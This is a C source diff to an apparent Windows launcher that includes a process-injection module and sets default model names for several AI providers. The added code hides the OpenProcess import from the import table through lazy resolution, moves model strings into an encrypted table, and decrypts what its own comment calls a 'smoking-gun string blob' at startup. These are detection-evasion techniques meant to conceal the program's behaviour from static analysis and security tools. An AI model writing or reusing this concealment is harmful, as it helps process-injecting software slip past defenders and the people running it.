@@ -24,6 +24,8 @@
 #include "../../shared/handshake.h"
 #include "../../shared/crypto_util.h"
 #include "../../shared/json_util.h"
+#include "../../shared/str_enc.h"
+#include "../../shared/lazy_api.h"
 #include "config_write.h"
 #include "inject.h"
 #include "license.h"
@@ -37,6 +39,16 @@
 
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "shell32.lib")
+
+/* Lazy-resolve OpenProcess so it doesn't appear in the IAT. Same
+ * technique as inject.c but scoped locally here since main.c has its
+ * own kill/kill-all paths that call OpenProcess with different flags. */
+typedef HANDLE (WINAPI *PFN_OpenProcessML)(DWORD, BOOL, DWORD);
+static PFN_OpenProcessML g_pOpenProcessML = NULL;
+#define OpenProcess(desired, inherit, pid) \
+    ((g_pOpenProcessML ? g_pOpenProcessML : \
+      (g_pOpenProcessML = LAZY_API(PFN_OpenProcessML, L"kernel32.dll", "OpenProcess"))) \
+     ((desired), (inherit), (pid)))
 
 /* ── Elevation check ──────────────────────────────────────────────── */
 static int is_elevated(void) {
@@ -269,8 +281,8 @@ static void load_env_config(svc_config_t *cfg, const oauth_session_t *sess) {
     GetEnvironmentVariableA("SVCLDB_MODEL",   cfg->model,   sizeof(cfg->model));
     if (cfg->model[0] == 0) {
         switch (cfg->provider) {
-            case SVC_PROVIDER_OPENAI:     strncpy(cfg->model, "gpt-5.5",              sizeof(cfg->model) - 1); break;
-            case SVC_PROVIDER_ANTHROPIC:  strncpy(cfg->model, "claude-opus-4-8",      sizeof(cfg->model) - 1); break;
+            case SVC_PROVIDER_OPENAI:     strncpy(cfg->model, SS(SVC_STR_MODEL_OPENAI_GPT55),   sizeof(cfg->model) - 1); break;
+            case SVC_PROVIDER_ANTHROPIC:  strncpy(cfg->model, SS(SVC_STR_MODEL_ANTHROPIC_OPUS),sizeof(cfg->model) - 1); break;
             case SVC_PROVIDER_GOOGLE:     strncpy(cfg->model, "gemini-2.5-pro",       sizeof(cfg->model) - 1); break;
             case SVC_PROVIDER_OPENROUTER: strncpy(cfg->model, "anthropic/claude-opus-4.8", sizeof(cfg->model) - 1); break;
         }
@@ -455,6 +467,9 @@ int main(int argc, char *argv[]) {
             i++;   /* consume the path arg */
         }
     }
+
+    /* Decrypt smoking-gun string blob before any logging. Idempotent. */
+    svc_str_init();
 
     slog_launcher("=== launcher start ===");
 
